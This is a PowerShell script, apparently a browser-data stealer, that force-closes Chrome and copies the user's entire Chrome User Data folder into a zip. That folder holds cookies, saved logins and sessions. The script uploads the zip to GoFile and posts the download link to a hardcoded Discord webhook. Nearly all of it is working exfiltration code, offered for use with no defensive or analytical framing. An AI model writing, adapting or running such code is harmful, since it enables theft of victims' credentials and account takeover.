# Ensure execution policy is bypassed
Set-ExecutionPolicy Bypass -Scope Process -Force

# Created by mrproxy
$botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
$chatID = "your-chat-id"               # Replace with your Telegram chat ID
$webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"  # Replace with your Discord Webhook URL

# Debug log file
$logFile = "$env:TEMP\debug_log.txt"

# Force close Chrome to ensure files aren't in use
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
if ($chromeProcesses) {
    # Attempt to gracefully stop Chrome processes
    Stop-Process -Name "chrome" -Force
    Add-Content -Path $logFile -Value "Force closed Chrome to ensure files aren't in use."
} else {
    Add-Content -Path $logFile -Value "No Chrome processes found to close."
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param ([string]$message)

    $body = @{ content = $message }

    try {
        Add-Content -Path $logFile -Value "Sending message to Discord: $message"
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        Add-Content -Path $logFile -Value "Message sent to Discord: $message"
    } catch {
        Add-Content -Path $logFile -Value "Failed to send message to Discord: $_"
    }
}

# Function to upload file and get download link from GoFile
function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

    # Debug log entry at the start of the function
    Add-Content -Path $logFile -Value "Starting upload for file: $filePath"
    
  # Step 1: Get available GoFile upload server
Add-Content -Path $logFile -Value "Getting GoFile server..."
$serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/servers' -Method Get
if (-not $serverResponse.data.servers) {
    Add-Content -Path $logFile -Value "Failed to get GoFile server: $($serverResponse.status)"
    Send-DiscordMessage -message "Failed to get GoFile server."
    return $null
}

# Select the first available server from the list
$uploadServer = $serverResponse.data.servers[0].name
$uploadUri = "https://$uploadServer.gofile.io/contents/uploadfile"
Add-Content -Path $logFile -Value "GoFile server found: $uploadUri"

    # Step 2: Check if file exists before attempting upload
    if (-not (Test-Path $filePath)) {
        Add-Content -Path $logFile -Value "File not found: $filePath"
        Send-DiscordMessage -message "File not found for upload."
        return $null
    }

    # Step 3: Prepare file for upload
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileBase64 = [System.Convert]::ToBase64String($fileBytes)

        # Prepare form-data body
        $body = @{
            file = $fileBase64
        }

        # Step 4: Upload the file
        Add-Content -Path $logFile -Value "Uploading file..."
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -Form $body
        if ($response.status -ne "ok" -or -not $response.data.downloadPage) {
            Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
            Send-DiscordMessage -message "Failed to upload file to GoFile."
            return $null
        }

        $downloadLink = $response.data.downloadPage
        Add-Content -Path $logFile -Value "File uploaded successfully: $downloadLink"
        Send-DiscordMessage -message "File uploaded successfully: $downloadLink"
        return $downloadLink
    } catch {
        Add-Content -Path $logFile -Value "Error uploading file: $_"
        Send-DiscordMessage -message "Error uploading file to GoFile."
        return $null
    }
}

# Define Chrome User Data path
$chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
$outputZip = "$env:TEMP\chrome_data.zip"

# Function to copy files with retry logic for locked files
function Copy-WithRetry {
    param (
        [string]$source,
        [string]$destination,
        [int]$maxRetries = 3,
        [int]$retryDelay = 3
    )

    $retryCount = 0
    $success = $false

    while ($retryCount -lt $maxRetries -and !$success) {
        try {
            Copy-Item -Path $source -Destination $destination -ErrorAction Stop
            $success = $true
        } catch [System.IO.IOException] {
            $retryCount++
            Add-Content -Path $logFile -Value "File is locked, retrying ($retryCount/$maxRetries): $source"
            Start-Sleep -Seconds $retryDelay
        } catch {
            Add-Content -Path $logFile -Value "Error copying file: $($_) - $source"
            return $false
        }
    }

    return $success
}

# Updated file copy loop using retry logic
try {
    if (Test-Path $outputZip) {
        Remove-Item $outputZip -Force
    }

    $tempFolder = "$env:TEMP\ChromeBackup"
    if (Test-Path $tempFolder) {
        Remove-Item -Recurse -Force $tempFolder
    }
    New-Item -ItemType Directory -Path $tempFolder | Out-Null

    # Copy files while skipping locked files
    Get-ChildItem -Path $chromePath -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $destination = $_.FullName -replace [regex]::Escape($chromePath), $tempFolder
        if (-not (Test-Path $destination)) {
            New-Item -ItemType Directory -Path (Split-Path -Parent $destination) -Force | Out-Null
        }

        if (Copy-WithRetry -source $_.FullName -destination $destination) {
            Add-Content -Path $logFile -Value "File copied successfully: $($_.FullName)"
        } else {
            Add-Content -Path $logFile -Value "Skipped file (in use): $($_.FullName)"
        }
    }

    # Zip the copied data
    Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZip -Force
    Remove-Item -Recurse -Force $tempFolder
} catch {
    Send-DiscordMessage -message "Failed to create ZIP file."
    Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
    exit
}
# After all files are copied and compressed, upload the zip file to GoFile
if (Test-Path $outputZip) {
    Add-Content -Path $logFile -Value "Found zip file: $outputZip. Attempting to upload..."
    
    # Add logging to confirm function call
    try {
        $uploadLink = Upload-FileAndGetLink -filePath $outputZip
        if ($uploadLink) {
            Add-Content -Path $logFile -Value "Upload successful. Link: $uploadLink"
            Send-DiscordMessage -message "File uploaded successfully: $uploadLink"
        } else {
            Add-Content -Path $logFile -Value "Failed to upload zip file to GoFile."
            Send-DiscordMessage -message "Failed to upload zip file."
        }
    } catch {
        Add-Content -Path $logFile -Value "Error during upload attempt: $_"
        Send-DiscordMessage -message "Error during file upload."
    }
} else {
    Add-Content -Path $logFile -Value "Output zip file not found. Skipping upload."
}
